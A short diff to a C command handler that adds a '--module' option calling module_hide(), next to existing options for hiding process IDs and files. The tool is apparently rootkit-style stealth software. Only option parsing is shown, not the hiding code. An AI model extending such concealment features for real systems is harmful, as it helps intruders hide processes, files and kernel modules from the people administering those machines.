@@ -3,15 +3,15 @@
 #include "commands/hide.h"
 #include "lib/ketopt.h"
 #include "proc_hide.h"
+#include "module_hide.h"
 #include "log.h"
 
-enum { opt_hide_pid,
-       opt_hide_file,
-};
+enum { opt_hide_pid, opt_hide_file, opt_hide_module };
 
 const static ko_longopt_t longopts[] = {
 	{ "pid", ko_required_argument, opt_hide_pid },
 	{ "file", ko_required_argument, opt_hide_file },
+	{ "module", ko_no_argument, opt_hide_module },
 	{ NULL, 0, 0 }
 };
 
@@ -36,6 +36,9 @@ int hide_handler(int argc, char **argv)
 			}
 			break;
 		case opt_hide_file:
+			break;
+		case opt_hide_module:
+			err += module_hide();
 			break;
 		}
 	}
